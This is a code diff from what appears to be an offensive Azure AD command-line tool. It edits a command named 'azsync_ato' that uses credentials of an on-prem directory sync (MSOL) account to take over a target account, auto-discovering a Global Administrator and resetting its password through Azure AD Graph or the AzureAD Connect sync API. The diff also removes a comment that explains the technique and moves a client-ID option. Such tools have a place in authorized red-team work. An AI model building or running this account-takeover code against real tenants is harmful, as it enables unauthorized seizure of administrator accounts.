@@ -105,13 +105,7 @@ def resolve_object_id(token, tenant, identifier):
     return object_id
 
 
-# The AzureAD Connect sync API. Writing a password hash via ProvisionCredentials
-# overwrites the target's cloud password with one we control, and unlike AAD Graph
-# it works even against cloud-only Global Admins. Ported from AADInternals'
-# AzureADConnectAPI (Set-UserPassword / Create-SyncEnvelope / Call-ADSyncAPI). The
-# endpoint only speaks WCF binary XML (application/soap+msbin1), encoded in _wcf.
-# Requires Directory Synchronization on the tenant (implied by a sync account
-# existing) with Password Hash Sync usable.
+
 SYNC_SERVER = "adminwebservice.microsoftonline.com"
 SYNC_APP_ID = "1651564e-7ce4-4d99-88be-0a65050d8dc3"
 SYNC_CLIENT_VERSION = "8.0"
@@ -246,12 +240,12 @@ def _generate_password(length=20):
 @handle_cli_errors
 def azsync_ato(
     tenant: str = typer.Option(..., "-t", "--tenant", help="Tenant ID (or domain) of the target directory"),
+    client_id: str = typer.Option("1b730954-1685-4b74-9bfd-dac224a7b894", "-c", "--client-id", help="Public client ID for the ROPC token (Optional, defaults to Azure AD PowerShell)"),
     username: str = typer.Option(..., "-u", "--username", help="UPN of the on-prem sync account (e.g. Sync_HOST_xxxx@tenant.onmicrosoft.com)"),
     password: str = typer.Option(..., "-p", "--password", help="Password of the sync account"),
     ga_id: str = typer.Option(None, "-g", "--ga-id", help="Object ID (or UPN) of the target account to take over (Optional, auto-discovers a Global Administrator if omitted)"),
     new_password: str = typer.Option(None , "-n", "--new-password", help="Password to set on the target (Optional, generated if omitted)"),
     provisioning: bool = typer.Option(False, "-r", "--provisioning", help="Reset via the AzureAD Connect sync API (password-hash sync) instead of Azure AD Graph (works against cloud-only Global Admins that AAD Graph blocks)"),
-    client_id: str = typer.Option("1b730954-1685-4b74-9bfd-dac224a7b894", "-c", "--client-id", help="Public client ID for the ROPC token (Optional, defaults to Azure AD PowerShell)"),
 ):
     """Take over a target account (e.g. a Global Admin) by abusing on-prem sync (MSOL) account credentials"""
     tenant = require_tenant(tenant, console)
